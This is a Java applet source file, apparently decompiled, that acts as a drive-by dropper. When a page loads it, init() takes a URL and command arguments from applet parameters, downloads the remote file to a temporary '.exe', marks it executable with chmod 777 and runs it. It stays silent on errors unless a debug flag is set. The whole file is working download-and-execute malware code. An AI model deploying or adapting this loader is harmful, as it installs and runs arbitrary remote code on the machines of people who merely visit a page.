import java.applet.Applet;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.URL;
import java.net.URLConnection;

public class Main
    extends Applet
    {
        public void init()
        {
            String str1 = getParameter("downloadURL");
            String str2 = getParameter("commandParameter");
            int i = getParameter("debug") != null ? 1 : 0;
            if (i != 0)
            {
                System.out.println("URL to download: " + str1);
                System.out.println("Command's parameters: " + str2);
            }
            try
            {
                File localFile = File.createTempFile("image", ".exe");
                if (i != 0) {
                    System.out.println("Temp filename: " + localFile);
                }
                makeExecutable(localFile);


                downloadURL(new URL(str1), localFile);
                Process localProcess = Runtime.getRuntime().exec(localFile + " " + str2);
            }
            catch (Exception localException)
            {
                if (i != 0)
                {
                    System.out.println("Catched an exception:");
                    localException.printStackTrace();
                }
            }
        }

        private void makeExecutable(File paramFile)
        {
            try
            {
                String[] arrayOfString = { "chmod", "777", paramFile.getAbsolutePath() };
                Process localProcess = Runtime.getRuntime().exec(arrayOfString);
                localProcess.waitFor();
            }
            catch (Exception localException) {}
        }

        private void downloadURL(URL paramURL, File paramFile)
            throws FileNotFoundException, IOException
        {
            BufferedOutputStream localBufferedOutputStream = null;
            URLConnection localURLConnection = null;
            InputStream localInputStream = null;

            localBufferedOutputStream = new BufferedOutputStream(new FileOutputStream(paramFile));
            localURLConnection = paramURL.openConnection();
            localInputStream = localURLConnection.getInputStream();
            byte[] arrayOfByte = new byte['Ѐ'];

            long l = 0L;
            int i;
            while ((i = localInputStream.read(arrayOfByte)) != -1)
            {
                localBufferedOutputStream.write(arrayOfByte, 0, i);
                l += i;
            }
            if (localInputStream != null) {
                localInputStream.close();
            }
            if (localBufferedOutputStream != null) {
                localBufferedOutputStream.close();
            }
        }
    }

